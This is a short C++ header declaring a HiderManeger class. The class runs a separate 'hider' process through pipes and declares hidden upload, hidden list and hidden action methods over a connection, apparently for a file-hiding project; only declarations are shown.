/*

HIDER USE INSTRUCTIONS:

HiderManeger hiderManager = HiderManeger();
WRITE_FILE
HIDER_SETUP
HIDER_UPLOAD
...
...

*/


#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/wait.h>

#include "FunCodes.h"
#include "Connection.h"
#include "../ManegerAndHider/Status.h"
#include "HiderCodes.h"
#include "../ManegerAndHider/encoding.h"

#ifndef HIDER_MANEGER_H
#define HIDER_MANEGER_H

#define DEFAULT_HIDER_PATH ("./matbuja")


class HiderManeger
{
private:
    std::string hiderPath;
    int mthpipe[2]; // pipe from manager -> hider
    bool MtHredirect;
    int htmpipe[2]; // pipe from hider -> manager
    bool HtMredirect;

    Status activateHider(const command& cmd, int fdIn, int fdOut);

    void activateHiderChild(const command& cmd, int fdIn, int fdOut);
    
    Status openPipes(int p[]);

    Status hiddenUpload(const command& cmd, Connection& conn);

    Status hiddenList(Connection& conn);

public:
    HiderManeger();
    ~HiderManeger();

    Status setUpHider(std::string hiderPath);

    Status hiddenAction(const command& cmd, Connection& conn);



};

#endif